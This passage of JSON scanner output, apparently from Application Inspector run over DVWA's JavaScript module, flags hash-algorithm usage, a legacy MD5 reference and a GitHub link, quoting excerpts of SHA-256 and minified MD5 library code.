        "excerpt": "var algorithm = is224 ? &#39;sha224&#39; : &#39;sha256&#39;;\nvar nodeMethod = function (message) {\n  if (typeof message === &#39;string&#39;) {\n    return crypto.createHash(algorithm).update(message, &#39;utf8&#39;).digest(&#39;hex&#39;);\n  } else {\n    if (message === null || message === undefined) {\n      throw new Error(ERROR);\n    } else if (message.constructor === ArrayBuffer) {\n      message = new Uint8Array(message);\n",
        "startLocationLine": 88,
        "startLocationColumn": 29,
        "endLocationLine": 88,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "Hash",
        "excerpt": "  }\n  if (Array.isArray(message) || ArrayBuffer.isView(message) ||\n    message.constructor === Buffer) {\n    return crypto.createHash(algorithm).update(new Buffer(message)).digest(&#39;hex&#39;);\n  } else {\n    return method(message);\n  }\n};\nreturn nodeMethod;\n",
        "startLocationLine": 98,
        "startLocationColumn": 29,
        "endLocationLine": 98,
        "endLocationColumn": 33
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "    }\n\n    this.block = this.start = this.bytes = this.hBytes = 0;\n    this.finalized = this.hashed = false;\n    this.first = true;\n    this.is224 = is224;\n  }\n\n  Sha256.prototype.update = function (message) {\n",
        "startLocationLine": 159,
        "startLocationColumn": 27,
        "endLocationLine": 159,
        "endLocationColumn": 31
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "    var code, index = 0, i, length = message.length, blocks = this.blocks;\n\n    while (index &lt; length) {\n      if (this.hashed) {\n        this.hashed = false;\n        blocks[0] = this.block;\n        blocks[16] = blocks[1] = blocks[2] = blocks[3] =\n          blocks[4] = blocks[5] = blocks[6] = blocks[7] =\n          blocks[8] = blocks[9] = blocks[10] = blocks[11] =\n",
        "startLocationLine": 188,
        "startLocationColumn": 16,
        "endLocationLine": 188,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "\n    while (index &lt; length) {\n      if (this.hashed) {\n        this.hashed = false;\n        blocks[0] = this.block;\n        blocks[16] = blocks[1] = blocks[2] = blocks[3] =\n          blocks[4] = blocks[5] = blocks[6] = blocks[7] =\n          blocks[8] = blocks[9] = blocks[10] = blocks[11] =\n          blocks[12] = blocks[13] = blocks[14] = blocks[15] = 0;\n",
        "startLocationLine": 189,
        "startLocationColumn": 14,
        "endLocationLine": 189,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "  if (i &gt;= 64) {\n    this.block = blocks[16];\n    this.start = i - 64;\n    this.hash();\n    this.hashed = true;\n  } else {\n    this.start = i;\n  }\n}\n",
        "startLocationLine": 228,
        "startLocationColumn": 14,
        "endLocationLine": 228,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "    this.block = blocks[16];\n    this.start = i - 64;\n    this.hash();\n    this.hashed = true;\n  } else {\n    this.start = i;\n  }\n}\nif (this.bytes &gt; 4294967295) {\n",
        "startLocationLine": 229,
        "startLocationColumn": 14,
        "endLocationLine": 229,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "blocks[i &gt;&gt; 2] |= EXTRA[i &amp; 3];\nthis.block = blocks[16];\nif (i &gt;= 56) {\n  if (!this.hashed) {\n    this.hash();\n  }\n  blocks[0] = this.block;\n  blocks[16] = blocks[1] = blocks[2] = blocks[3] =\n    blocks[4] = blocks[5] = blocks[6] = blocks[7] =\n",
        "startLocationLine": 251,
        "startLocationColumn": 17,
        "endLocationLine": 251,
        "endLocationColumn": 21
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "this.block = blocks[16];\nif (i &gt;= 56) {\n  if (!this.hashed) {\n    this.hash();\n  }\n  blocks[0] = this.block;\n  blocks[16] = blocks[1] = blocks[2] = blocks[3] =\n    blocks[4] = blocks[5] = blocks[6] = blocks[7] =\n    blocks[8] = blocks[9] = blocks[10] = blocks[11] =\n",
        "startLocationLine": 252,
        "startLocationColumn": 14,
        "endLocationLine": 252,
        "endLocationColumn": 18
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "    }\n    blocks[14] = this.hBytes &lt;&lt; 3 | this.bytes &gt;&gt;&gt; 29;\n    blocks[15] = this.bytes &lt;&lt; 3;\n    this.hash();\n  };\n\n  Sha256.prototype.hash = function () {\n    var a = this.h0, b = this.h1, c = this.h2, d = this.h3, e = this.h4, f = this.h5, g = this.h6,\n      h = this.h7, blocks = this.blocks, j, s0, s1, maj, t1, t2, ch, ab, da, cd, bc;\n",
        "startLocationLine": 262,
        "startLocationColumn": 10,
        "endLocationLine": 262,
        "endLocationColumn": 14
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "hash",
        "excerpt": "    this.hash();\n  };\n\n  Sha256.prototype.hash = function () {\n    var a = this.h0, b = this.h1, c = this.h2, d = this.h3, e = this.h4, f = this.h5, g = this.h6,\n      h = this.h7, blocks = this.blocks, j, s0, s1, maj, t1, t2, ch, ab, da, cd, bc;\n\n    for (j = 16; j &lt; 64; ++j) {\n      // rightrotate\n",
        "startLocationLine": 265,
        "startLocationColumn": 20,
        "endLocationLine": 265,
        "endLocationColumn": 24
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "Hash",
        "excerpt": "Sha256.prototype.finalize.call(this);\nif (this.inner) {\n  this.inner = false;\n  var innerHash = this.array();\n  Sha256.call(this, this.is224, this.sharedMemory);\n  this.update(this.oKeyPad);\n  this.update(innerHash);\n  Sha256.prototype.finalize.call(this);\n}\n",
        "startLocationLine": 493,
        "startLocationColumn": 16,
        "endLocationLine": 493,
        "endLocationColumn": 20
      },
      {
        "Language": {
          "name": "javascript",
          "extensions": [
            ".js"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/high_unobfuscated.js",
        "ruleId": "AI009200",
        "ruleName": "Cryptography: Hash Algorithm (General)",
        "ruleDescription": "Cryptography: Hash Algorithm (General)",
        "pattern": "hash",
        "type": "Regex",
        "confidence": "Medium",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.General"
        ],
        "sample": "Hash",
        "excerpt": "      var innerHash = this.array();\n      Sha256.call(this, this.is224, this.sharedMemory);\n      this.update(this.oKeyPad);\n      this.update(innerHash);\n      Sha256.prototype.finalize.call(this);\n    }\n  };\n\n  var exports = createMethod();\n",
        "startLocationLine": 496,
        "startLocationColumn": 24,
        "endLocationLine": 496,
        "endLocationColumn": 28
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/low.php",
        "ruleId": "AI001200",
        "ruleName": "Cloud Service: Code Repository (GitHub)",
        "ruleDescription": "Cloud Service: Code Repository (GitHub)",
        "pattern": "\\b(github)\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Metadata.CloudServices.Code.Repo.GitHub"
        ],
        "sample": "github",
        "excerpt": "\n/*\nMD5 code from here\nhttps://github.com/blueimp/JavaScript-MD5\n*/\n\n!function(n){&quot;use strict&quot;;function t(n,t){var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r}function r(n,t){return n&lt;&lt;t|n&gt;&gt;&gt;32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&amp;r|~t&amp;o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&amp;o|r&amp;~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r}function d(n){var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function(){return A}):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A}(this);\n\n\tfunction rot13(inp) {\n",
        "startLocationLine": 7,
        "startLocationColumn": 9,
        "endLocationLine": 7,
        "endLocationColumn": 15
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "&lt;script&gt;\n\n/*\nMD5 code from here\nhttps://github.com/blueimp/JavaScript-MD5\n*/\n\n!function(n){&quot;use strict&quot;;function t(n,t){var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r}function r(n,t){return n&lt;&lt;t|n&gt;&gt;&gt;32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&amp;r|~t&amp;o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&amp;o|r&amp;~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r}function d(n){var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return t?r?s(t,n):C(t,n):r?m(n):p(n)}&quot;function&quot;==typeof define&amp;&amp;define.amd?define(function(){return A}):&quot;object&quot;==typeof module&amp;&amp;module.exports?module.exports=A:n.md5=A}(this);\n\n",
        "startLocationLine": 6,
        "startLocationColumn": 1,
        "endLocationLine": 6,
        "endLocationColumn": 4
      },
      {
        "Language": {
          "name": "php",
          "extensions": [
            ".php"
          ],
          "type": 0
        },
        "fileName": "/home/dev/tools/DVWA/vulnerabilities/javascript/source/low.php",
        "ruleId": "AI008800",
        "ruleName": "Cryptography: Hash Algorithm (Legacy)",
        "ruleDescription": "Cryptography: Hash Algorithm (Legacy)",
        "pattern": "\\b(MD2|MD4|MD5|SHA-*(0|1))\\b",
        "type": "Regex",
        "confidence": "High",
        "severity": "Moderate",
        "tags": [
          "Cryptography.HashAlgorithm.Legacy"
        ],
        "sample": "MD5",
        "excerpt": "\n/*\nMD5 code from here\nhttps://github.com/blueimp/JavaScript-MD5\n*/\n\n!function(n){&quot;use strict&quot;;function t(n,t){var r=(65535&amp;n)+(65535&amp;t);return(n&gt;&gt;16)+(t&gt;&gt;16)+(r&gt;&gt;16)&lt;&lt;16|65535&amp;r}function r(n,t){return n&lt;&lt;t|n&gt;&gt;&gt;32-t}function e(n,e,o,u,c,f){return t(r(t(t(e,n),t(u,f)),c),o)}function o(n,t,r,o,u,c,f){return e(t&amp;r|~t&amp;o,n,t,u,c,f)}function u(n,t,r,o,u,c,f){return e(t&amp;o|r&amp;~o,n,t,u,c,f)}function c(n,t,r,o,u,c,f){return e(t^r^o,n,t,u,c,f)}function f(n,t,r,o,u,c,f){return e(r^(t|~o),n,t,u,c,f)}function i(n,r){n[r&gt;&gt;5]|=128&lt;&lt;r%32,n[14+(r+64&gt;&gt;&gt;9&lt;&lt;4)]=r;var e,i,a,d,h,l=1732584193,g=-271733879,v=-1732584194,m=271733878;for(e=0;e&lt;n.length;e+=16)i=l,a=g,d=v,h=m,g=f(g=f(g=f(g=f(g=c(g=c(g=c(g=c(g=u(g=u(g=u(g=u(g=o(g=o(g=o(g=o(g,v=o(v,m=o(m,l=o(l,g,v,m,n[e],7,-680876936),g,v,n[e+1],12,-389564586),l,g,n[e+2],17,606105819),m,l,n[e+3],22,-1044525330),v=o(v,m=o(m,l=o(l,g,v,m,n[e+4],7,-176418897),g,v,n[e+5],12,1200080426),l,g,n[e+6],17,-1473231341),m,l,n[e+7],22,-45705983),v=o(v,m=o(m,l=o(l,g,v,m,n[e+8],7,1770035416),g,v,n[e+9],12,-1958414417),l,g,n[e+10],17,-42063),m,l,n[e+11],22,-1990404162),v=o(v,m=o(m,l=o(l,g,v,m,n[e+12],7,1804603682),g,v,n[e+13],12,-40341101),l,g,n[e+14],17,-1502002290),m,l,n[e+15],22,1236535329),v=u(v,m=u(m,l=u(l,g,v,m,n[e+1],5,-165796510),g,v,n[e+6],9,-1069501632),l,g,n[e+11],14,643717713),m,l,n[e],20,-373897302),v=u(v,m=u(m,l=u(l,g,v,m,n[e+5],5,-701558691),g,v,n[e+10],9,38016083),l,g,n[e+15],14,-660478335),m,l,n[e+4],20,-405537848),v=u(v,m=u(m,l=u(l,g,v,m,n[e+9],5,568446438),g,v,n[e+14],9,-1019803690),l,g,n[e+3],14,-187363961),m,l,n[e+8],20,1163531501),v=u(v,m=u(m,l=u(l,g,v,m,n[e+13],5,-1444681467),g,v,n[e+2],9,-51403784),l,g,n[e+7],14,1735328473),m,l,n[e+12],20,-1926607734),v=c(v,m=c(m,l=c(l,g,v,m,n[e+5],4,-378558),g,v,n[e+8],11,-2022574463),l,g,n[e+11],16,1839030562),m,l,n[e+14],23,-35309556),v=c(v,m=c(m,l=c(l,g,v,m,n[e+1],4,-1530992060),g,v,n[e+4],11,1272893353),l,g,n[e+7],16,-155497632),m,l,n[e+10],23,-1094730640),v=c(v,m=c(m,l=c(l,g,v,m,n[e+13],4,681279174),g,v,n[e],11,-358537222),l,g,n[e+3],16,-722521979),m,l,n[e+6],23,76029189),v=c(v,m=c(m,l=c(l,g,v,m,n[e+9],4,-640364487),g,v,n[e+12],11,-421815835),l,g,n[e+15],16,530742520),m,l,n[e+2],23,-995338651),v=f(v,m=f(m,l=f(l,g,v,m,n[e],6,-198630844),g,v,n[e+7],10,1126891415),l,g,n[e+14],15,-1416354905),m,l,n[e+5],21,-57434055),v=f(v,m=f(m,l=f(l,g,v,m,n[e+12],6,1700485571),g,v,n[e+3],10,-1894986606),l,g,n[e+10],15,-1051523),m,l,n[e+1],21,-2054922799),v=f(v,m=f(m,l=f(l,g,v,m,n[e+8],6,1873313359),g,v,n[e+15],10,-30611744),l,g,n[e+6],15,-1560198380),m,l,n[e+13],21,1309151649),v=f(v,m=f(m,l=f(l,g,v,m,n[e+4],6,-145523070),g,v,n[e+11],10,-1120210379),l,g,n[e+2],15,718787259),m,l,n[e+9],21,-343485551),l=t(l,i),g=t(g,a),v=t(v,d),m=t(m,h);return[l,g,v,m]}function a(n){var t,r=&quot;&quot;,e=32*n.length;for(t=0;t&lt;e;t+=8)r+=String.fromCharCode(n[t&gt;&gt;5]&gt;&gt;&gt;t%32&amp;255);return r}function d(n){var t,r=[];for(r[(n.length&gt;&gt;2)-1]=void 0,t=0;t&lt;r.length;t+=1)r[t]=0;var e=8*n.length;for(t=0;t&lt;e;t+=8)r[t&gt;&gt;5]|=(255&amp;n.charCodeAt(t/8))&lt;&lt;t%32;return r}function h(n){return a(i(d(n),8*n.length))}function l(n,t){var r,e,o=d(n),u=[],c=[];for(u[15]=c[15]=void 0,o.length&gt;16&amp;&amp;(o=i(o,8*n.length)),r=0;r&lt;16;r+=1)u[r]=909522486^o[r],c[r]=1549556828^o[r];return e=i(u.concat(d(t)),512+8*t.length),a(i(c.concat(e),640))}function g(n){var t,r,e=&quot;&quot;;for(r=0;r&lt;n.length;r+=1)t=n.charCodeAt(r),e+=&quot;0123456789abcdef&quot;.charAt(t&gt;&gt;&gt;4&amp;15)+&quot;0123456789abcdef&quot;.charAt(15&amp;t);return e}function v(n){return unescape(encodeURIComponent(n))}function m(n){return h(v(n))}function p(n){return g(m(n))}function s(n,t){return l(v(n),v(t))}function C(n,t){return g(s(n,t))}function A(n,t,r){return 